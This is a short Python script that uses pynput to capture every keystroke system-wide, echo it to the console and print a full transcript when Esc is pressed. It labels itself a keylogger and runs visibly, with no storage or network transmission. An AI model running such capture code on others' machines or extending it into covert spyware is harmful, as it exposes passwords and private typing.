from pynput.keyboard import Key, Listener

events = []

def display_events(char):
    """Print a single character/key live, without a newline after each one."""
    print(char, end="", flush=True)


def on_press(key):
    """Callback function triggered whenever a key is pressed."""
    try:
        # standard character keys
        char = key.char
    except AttributeError:
        # special keys
        if key == Key.space:
            char = " "
        elif key == Key.enter:
            char = "\n"
        elif key == Key.tab:
            char = "\t"
        else:
            char = f" [{key.name.upper()}] "

    events.append(char)
    display_events(char)


def on_release(key):
    """Callback function triggered when a key is released."""
    if key == Key.esc:
        print("\n\nStopping keylogger...")
        # stop listener
        return False


print("Keylogger is running... Press 'Esc' to stop.")
with Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()

print("\nFull transcript:")
print("".join(events))